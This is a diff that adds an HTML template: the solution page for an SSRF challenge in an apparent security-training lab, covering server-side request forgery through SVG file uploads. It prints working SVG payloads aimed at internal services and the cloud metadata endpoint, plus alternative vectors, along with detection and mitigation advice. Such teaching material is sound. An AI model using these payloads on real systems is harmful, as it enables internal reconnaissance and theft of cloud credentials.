@@ -1,0 +1,109 @@
+{% extends 'base.html' %}
+
+{% block title %}SSRF Level 6 Solution - R00tGlyph{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-10 offset-md-1">
+        <div class="card">
+            <div class="card-header bg-dark text-white">
+                <h2 class="text-center">SSRF Level 6 Solution: SSRF via File Upload</h2>
+            </div>
+            <div class="card-body">
+                <h3>Solution</h3>
+                <p>This challenge demonstrates SSRF through SVG file uploads, where external references in SVG files are processed by the server.</p>
+
+                <h4>Step-by-Step Solution:</h4>
+                <ol>
+                    <li><strong>Understand SVG structure:</strong> SVG files can contain external references</li>
+                    <li><strong>Create malicious SVG:</strong> Include &lt;image&gt; tags with internal URLs</li>
+                    <li><strong>Target internal services:</strong> Point href attributes to internal addresses</li>
+                    <li><strong>Submit the SVG:</strong> Upload the malicious SVG content</li>
+                </ol>
+
+                <h4>Malicious SVG Payload:</h4>
+                <div class="card bg-dark text-light mb-3">
+                    <div class="card-body">
+                        <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg" 
+     xmlns:xlink="http://www.w3.org/1999/xlink" 
+     width="100" height="100"&gt;
+  
+  &lt;!-- Basic internal service access --&gt;
+  &lt;image href="http://localhost:80" width="100" height="100"/&gt;
+  
+  &lt;!-- Target specific internal services --&gt;
+  &lt;image href="http://127.0.0.1:3306" width="100" height="100"/&gt;
+  &lt;image href="http://192.168.1.1:22" width="100" height="100"/&gt;
+  
+  &lt;!-- Cloud metadata access --&gt;
+  &lt;image href="http://169.254.169.254/latest/meta-data/" width="100" height="100"/&gt;
+  
+&lt;/svg&gt;</code></pre>
+                    </div>
+                </div>
+
+                <h4>Alternative SVG Techniques:</h4>
+                <div class="card bg-dark text-light mb-3">
+                    <div class="card-body">
+                        <pre><code>&lt;!-- Using xlink:href (older syntax) --&gt;
+&lt;image xlink:href="http://localhost" width="100" height="100"/&gt;
+
+&lt;!-- Using foreignObject --&gt;
+&lt;foreignObject width="100" height="100"&gt;
+  &lt;iframe src="http://localhost"&gt;&lt;/iframe&gt;
+&lt;/foreignObject&gt;
+
+&lt;!-- Using use element --&gt;
+&lt;use href="http://localhost#element"/&gt;</code></pre>
+                    </div>
+                </div>
+
+                <h4>File Upload SSRF Vectors:</h4>
+                <ul>
+                    <li><strong>SVG files:</strong> External image references</li>
+                    <li><strong>XML files:</strong> External entity references (XXE)</li>
+                    <li><strong>Office documents:</strong> External template/media references</li>
+                    <li><strong>PDF files:</strong> External resource inclusion</li>
+                    <li><strong>HTML files:</strong> External resource loading</li>
+                </ul>
+
+                <h4>Detection and Testing:</h4>
+                <ol>
+                    <li>Monitor network traffic during file processing</li>
+                    <li>Use Burp Collaborator to detect outbound requests</li>
+                    <li>Check for different response times</li>
+                    <li>Look for error messages revealing internal services</li>
+                </ol>
+
+                <h4>Impact:</h4>
+                <ul>
+                    <li>Internal network reconnaissance through file uploads</li>
+                    <li>Bypass of upload-based security controls</li>
+                    <li>Access to internal services via file processing</li>
+                    <li>Potential for data exfiltration</li>
+                </ul>
+
+                <h4>Mitigation:</h4>
+                <ul>
+                    <li>Disable external entity processing in XML/SVG parsers</li>
+                    <li>Sanitize uploaded files before processing</li>
+                    <li>Process files in sandboxed environments</li>
+                    <li>Block outbound network access from file processors</li>
+                    <li>Validate and strip external references</li>
+                </ul>
+
+                <div class="alert alert-warning">
+                    <h5><i class="bi bi-exclamation-triangle-fill me-2"></i>File Processing Security</h5>
+                    <p class="mb-0">File upload functionality that processes external references is a common SSRF vector. Always disable external entity processing and validate file contents.</p>
+                </div>
+
+                <div class="text-center mt-4">
+                    <a href="/ssrf/level6" class="btn btn-primary me-2">Try Challenge Again</a>
+                    <a href="/ssrf/level7" class="btn btn-success">Next Challenge</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
